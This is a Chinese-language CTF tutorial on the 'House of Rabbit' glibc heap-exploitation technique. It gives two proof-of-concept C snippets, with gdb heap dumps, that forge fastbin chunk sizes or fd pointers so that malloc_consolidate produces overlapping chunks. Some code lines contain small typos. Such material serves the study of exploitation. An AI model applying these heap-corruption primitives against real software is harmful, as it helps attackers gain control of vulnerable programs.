# House of Rabbit

## 介紹
House of rabbit是一種僞造堆塊的技術，早在2017年已經提出，但在最近兩個月纔在CTF比賽中出現。我們一般運用在fastbin attack中，因爲unsorted bin等其它的bin有更好的利用手段。

## 原理
我們知道，fastbin中會把相同的size的被釋放的堆塊用一個單向鏈表管理，分配的時候會檢查size是否合理，如果不合理程序就會異常退出。而house of rabbit就利用了在malloc consolidate的時候fastbin中的堆塊進行合併時size沒有進行檢查從而僞造一個假的堆塊，爲進一步的利用做準備。

由於原作者的[POC](https://github.com/shift-crops/House_of_Rabbit)需要的條件較多，這裏我直接介紹這個攻擊的本質即可。

`前提條件`:
1. 可以修改fastbin的fd指針或size
2. 可以觸發malloc consolidate(merge top或malloc big chunk等等)


下面來看一下POC
`POC 1`: modify the size of fastbin chunk
```cpp
unsigned long* chunk1=malloc(0x40); //0x602000
unsigned long* chunk2=malloc(0x40); //0x602050
malloc(0x10);
free(chunk1);
free(chunk2);
/* Heap layout
0000| 0x602000 --> 0x0 
0008| 0x602008 --> 0x51 ('Q')
0016| 0x602010 --> 0x0 
..... 
0080| 0x602050 --> 0x0 
0088| 0x602058 --> 0x51 ('Q')
0096| 0x602060 --> 0x602000 --> 0x0 
0104| 0x602068 --> 0x0 
...... 
0160| 0x6020a0 --> 0x0 
0168| 0x6020a8 --> 0x21 ('!')
0176| 0x6020b0 --> 0x0 
0184| 0x6020b8 --> 0x0 
*/
chunk1[-1]=0xa1; //modify chunk1 size to be 0xa1
malloc(0x1000);  //allocate a large chunk, trigger malloc consolidate
/*Chunk1 overlap with chunk2 now
gdb-peda$ telescope 0x602000 100
0000| 0x602000 --> 0x0 
0008| 0x602008 --> 0xa1 
0016| 0x602010 --> 0x7ffff7dd1c08 --> 0x7ffff7dd1bf8 --> 0x7ffff7dd1be8 --> 0x7ffff7dd1bd8 --> 0x7ffff7dd1bc8 (--> ...)
0024| 0x602018 --> 0x7ffff7dd1c08 --> 0x7ffff7dd1bf8 --> 0x7ffff7dd1be8 --> 0x7ffff7dd1bd8 --> 0x7ffff7dd1bc8 (--> ...)
0032| 0x602020 --> 0x0 
.....
0080| 0x602050 --> 0x0 
0088| 0x602058 --> 0x51 ('Q')
0096| 0x602060 --> 0x7ffff7dd1bb8 --> 0x7ffff7dd1ba8 --> 0x7ffff7dd1b98 --> 0x7ffff7dd1b88 --> 0x7ffff7dd1b78 (--> ...)
0104| 0x602068 --> 0x7ffff7dd1bb8 --> 0x7ffff7dd1ba8 --> 0x7ffff7dd1b98 --> 0x7ffff7dd1b88 --> 0x7ffff7dd1b78 (--> ...)
0112| 0x602070 --> 0x0 
0120| 0x602078 --> 0x0 
....
0152| 0x602098 --> 0x0 
0160| 0x6020a0 --> 0xa0 
0168| 0x6020a8 --> 0x20 (' ')

gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x603450 (size : 0x1fbb0) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x050)  smallbin[ 3]: 0x602050
(0x0a0)  smallbin[ 8]: 0x602000 (overlap chunk with 0x602050(freed) )
*/
```
`POC 2`:modify FD pointer
```cpp
unsigned long* chunk1=malloc(0x40); //0x602000
unsigned long* chunk2=malloc(0x100);//0x602050

chunk2[1]=0x31; //fake chunk size 0x30
chunk2[7]=0x21  //fake chunk's next chunk
chunk2[11]=0x21 //fake chunk's next chunk's next chuck
/* Heap laylout
0000| 0x602000 --> 0x0 
0008| 0x602008 --> 0x51 ('Q')
0016| 0x602010 --> 0x0 
......
0080| 0x602050 --> 0x0 
0088| 0x602058 --> 0x111 
0096| 0x602060 --> 0x0 
0104| 0x602068 --> 0x31 ('1')
0112| 0x602070 --> 0x0 
......
0144| 0x602090 --> 0x0 
0152| 0x602098 --> 0x21 ('!')
0160| 0x6020a0 --> 0x0 
0168| 0x6020a8 --> 0x0 
0176| 0x6020b0 --> 0x0 
0184| 0x6020b8 --> 0x21 ('!')
0192| 0x6020c0 --> 0x0 
......
0352| 0x602160 --> 0x0 
0360| 0x602168 --> 0x20ea1
*/
free(chunk1);
chuck1[0]=0x602060;// modify the fd of chunk1
/*
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x602000 --> 0x602060 (size error (0x30)) --> 0x0
*/
malloc(5000);// malloc a  big chunk to trigger malloc consolidate
/*
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x6034f0 (size : 0x1fb10) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x050)  smallbin[ 3]: 0x602000
(0x030)  smallbin[ 1]: 0x602060
*/
```

原理很簡單，就是通過修改fastbin chunk的size(如上面的POC 1所示)直接構造overlap chunk，或者修改fd(如面的POC 2所示)，讓它指向一個fake chunk，觸發malloc consolidate之後讓這個fake chunk成爲一個合法的chunk。

## 總結
House of rabbit的優點是容易構造overlap chunk，由於可以基於fastbin attack，甚至不需要leak就可以完成攻擊。大家可以通過例題的練習加深對這個攻擊的理解。

## 例題
1. HITB-GSEC-XCTF 2018 mutepig
2. 待補充








